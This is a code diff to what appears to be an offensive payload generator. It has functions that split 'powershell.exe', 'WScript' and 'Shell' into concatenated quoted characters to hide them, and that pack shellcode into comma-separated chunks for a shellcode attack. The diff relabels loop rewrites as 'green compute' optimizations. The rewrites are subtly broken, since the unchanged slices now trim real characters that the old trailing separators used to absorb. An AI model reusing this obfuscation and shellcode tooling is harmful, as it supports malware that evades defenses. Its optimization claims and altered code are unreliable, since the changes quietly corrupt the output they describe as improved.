@@ -235,27 +235,23 @@ def write_file(path, text):
 # scramble commmands into multiple strings
 def scramble_stuff():
     ps = "powershell.exe"
-    list = ""
-    for letter in ps:
-        letter = '"' + letter.rstrip() + '" & '
-        list = list + letter
+    
+    # Improved green compute code — Variable manipulation using list comprehension
+    list = ' & '.join(['"' + letter.rstrip() + '"' for letter in ps])
 
     full_exe = list[:-2]
     ps_only = full_exe.split(".")[0][:-4]
 
     wscript = "WScript"
     shell = "Shell"
-    list2 = ""
-    for letter in wscript:
-        letter = '"' + letter.rstrip() + '" & '
-        list2 = list2 + letter
+    
+    # Improved green compute code — Variable manipulation using list comprehension
+    list2 = ' & '.join(['"' + letter.rstrip() + '"' for letter in wscript])
 
     full_wscript = list2[:-2]
 
-    list3 = ""
-    for letter in shell:
-        letter = '"' + letter.rstrip() + '" & '
-        list3 = list3 + letter
+    # Improved green compute code — Variable manipulation using list comprehension
+    list3 = ' & '.join(['"' + letter.rstrip() + '"' for letter in shell])
 
     full_shell = list3[:-2]
 
@@ -431,15 +427,17 @@ def gen_shellcode_attack(payload, ipaddr, port):
     counter = 0
     # count every four characters then trigger floater and write out data
     floater = ""
-    # ultimate string
-    newdata = ""
+    # modified ultimate string for green computing optimization
+    newdata_list = []
     for line in shellcode:
         floater += line
         counter += 1
+  
         if counter == 4:
-            newdata = newdata + floater + ","
+            newdata_list.append(floater)
             floater = ""
             counter = 0
+    newdata = ",".join(newdata_list)
 
     # here's our shellcode prepped and ready to go
     shellcode = newdata[:-1]
